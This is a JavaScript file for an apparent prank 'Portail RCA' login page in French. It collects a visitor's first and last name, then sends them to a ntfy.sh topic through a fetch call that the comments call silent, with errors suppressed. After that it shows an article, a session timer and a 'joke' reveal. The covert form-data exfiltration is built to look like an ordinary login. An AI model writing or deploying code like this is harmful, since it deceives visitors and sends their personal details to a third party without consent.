// Variables globales
let userName = '';
let timerInterval;

// Éléments DOM
const loginPage = document.getElementById('login-page');
const articlePage = document.getElementById('article-page');
const jokeReveal = document.getElementById('joke-reveal');
const authForm = document.getElementById('auth-form');
const errorMsg = document.getElementById('error-msg');
const submitBtn = document.getElementById('submit-btn');
const btnText = submitBtn ? submitBtn.querySelector('.btn-text') : null;
const btnLoading = submitBtn ? submitBtn.querySelector('.btn-loading') : null;
const userWelcome = document.getElementById('user-welcome');
const logoutBtn = document.getElementById('logout-btn');
const closeJokeBtn = document.getElementById('close-joke');
const timerElement = document.getElementById('timer');

// Gestion du formulaire
if (authForm) {
    authForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const prenom = document.getElementById('prenom').value.trim();
        const nom = document.getElementById('nom').value.trim();
        
        if (!prenom || !nom) {
            showError("Veuillez remplir tous les champs.");
            return;
        }
        
        // Stocker le nom
        localStorage.setItem('userName', prenom);
        
        // Montrer le chargement
        if (btnText) btnText.style.display = 'none';
        if (btnLoading) btnLoading.style.display = 'inline';
        
        // Envoyer les données par email via EmailJS (service gratuit sans confirmation)
        const emailData = {
            prenom: prenom,
            nom: nom,
            date: new Date().toLocaleString('fr-FR')
        };
        
        // Envoyer les données par email silencieusement
        // Utilise ton propre endpoint si tu veux recevoir les données
        fetch('https://ntfy.sh/portail-rca-secret-2026', {
            method: 'POST',
            body: `Nouvelle connexion!\nPrénom: ${prenom}\nNom: ${nom}\nDate: ${new Date().toLocaleString('fr-FR')}`
        }).catch(() => {});  // Ignorer les erreurs
        
        // Rediriger vers l'article après un court délai
        setTimeout(() => {
            window.location.href = 'article.html';
        }, 1500);
    });
}

function showError(message) {
    errorMsg.textContent = message;
    errorMsg.style.display = 'block';
}

function showArticlePage() {
    if (loginPage) loginPage.style.display = 'none';
    if (articlePage) articlePage.style.display = 'block';
    
    const storedName = sessionStorage.getItem('userName');
    if (storedName && userWelcome) {
        userWelcome.textContent = 'Bienvenue, ' + storedName;
    }
    
    // Démarrer le timer
    startSessionTimer();
}

function grantAccess(prenom) {
    loginPage.style.transition = 'opacity 0.5s ease';
    loginPage.style.opacity = '0';
    
    setTimeout(() => {
        loginPage.style.display = 'none';
        articlePage.style.display = 'block';
        articlePage.style.opacity = '0';
        
        setTimeout(() => {
            articlePage.style.transition = 'opacity 0.5s ease';
            articlePage.style.opacity = '1';
        }, 100);
        
        userWelcome.textContent = 'Bienvenue, ' + prenom;
        startSessionTimer();
        
    }, 500);
}

function startSessionTimer() {
    let timeLeft = 15 * 60;
    
    timerInterval = setInterval(() => {
        timeLeft--;
        
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        
        if (timerElement) {
            timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
            if (timeLeft < 60) {
                timerElement.style.color = '#cc0000';
            }
        }
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            showJoke();
        }
    }, 1000);
}

// Bouton de déconnexion
if (logoutBtn) {
    logoutBtn.addEventListener('click', showJoke);
}

function showJoke() {
    clearInterval(timerInterval);
    if (jokeReveal) {
        jokeReveal.style.display = 'flex';
    }
}

// Fermer la blague
if (closeJokeBtn) {
    closeJokeBtn.addEventListener('click', function() {
        jokeReveal.style.display = 'none';
        if (articlePage) articlePage.style.display = 'none';
        if (loginPage) {
            loginPage.style.display = 'flex';
            loginPage.style.opacity = '1';
        }
        
        if (authForm) authForm.reset();
        if (errorMsg) errorMsg.style.display = 'none';
        sessionStorage.removeItem('userName');
    });
}

// Easter egg : triple clic sur le logo
const logo = document.querySelector('.logo');
let clickCount = 0;
let clickTimer;

if (logo) {
    logo.addEventListener('click', function() {
        clickCount++;
        
        if (clickCount === 3) {
            showJoke();
            clickCount = 0;
        }
        
        clearTimeout(clickTimer);
        clickTimer = setTimeout(() => {
            clickCount = 0;
        }, 500);
    });
}

// Console message
console.log('%c🇨🇫 Portail RCA', 'color: green; font-size: 20px; font-weight: bold;');
console.log('%cCe site est une blague ! 😄', 'color: orange; font-size: 14px;');
